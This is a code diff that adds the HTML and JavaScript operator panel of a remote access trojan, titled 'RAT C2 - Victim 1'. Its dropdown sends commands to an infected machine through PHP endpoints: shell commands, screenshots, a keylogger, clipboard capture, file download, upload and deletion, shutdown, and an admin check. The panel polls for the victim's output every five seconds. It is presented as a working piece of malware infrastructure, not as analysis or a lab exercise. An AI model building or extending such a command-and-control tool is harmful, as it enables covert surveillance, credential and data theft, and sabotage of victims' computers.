@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>RAT C2 - Victim 1</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>RAT C2 - Victim 1</h1>
+        <select id="commandSelect">
+            <option value="">Select Command</option>
+            <option value="shell dir">Shell: dir</option>
+            <option value="screenshot">Screenshot</option>
+            <option value="download C:\example.txt">Download: C:\example.txt</option>
+            <option value="upload">Upload File</option>
+            <option value="sysinfo">System Info</option>
+            <option value="keylog">Keylogger</option>
+            <option value="message Hello, Victim!">Message: Hello, Victim!</option>
+            <option value="shutdown">Shutdown</option>
+            <option value="wallpaper">Change Wallpaper</option>
+            <option value="clipboard">Clipboard</option>
+            <option value="cd C:\Users">Change Directory: C:\Users</option>
+            <option value="delete C:\example.txt">Delete: C:\example.txt</option>
+            <option value="admincheck">Admin Check</option>
+        </select>
+        <button onclick="sendCommand()">Execute</button>
+        <div id="output"></div>
+    </div>
+    <script>
+        async function sendCommand() {
+            const select = document.getElementById('commandSelect');
+            const command = select.value;
+            if (!command) return;
+
+            // Send command to functions-1.html
+            await fetch('functions-1.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `command=${encodeURIComponent(command)}`
+            });
+
+            // Fetch outputs
+            const response = await fetch(`output.php?session=${encodeURIComponent('<?=$SESSION_ID?>')}`);
+            const outputs = await response.json();
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML = '<h2>Output:</h2><pre>' + outputs.join('\n') + '</pre>';
+        }
+
+        // Poll outputs every 5 seconds
+        setInterval(async () => {
+            const response = await fetch(`output.php?session=${encodeURIComponent('<?=$SESSION_ID?>')}`);
+            const outputs = await response.json();
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML = '<h2>Output:</h2><pre>' + outputs.join('\n') + '</pre>';
+        }, 5000);
+    </script>
+</body>
+</html>
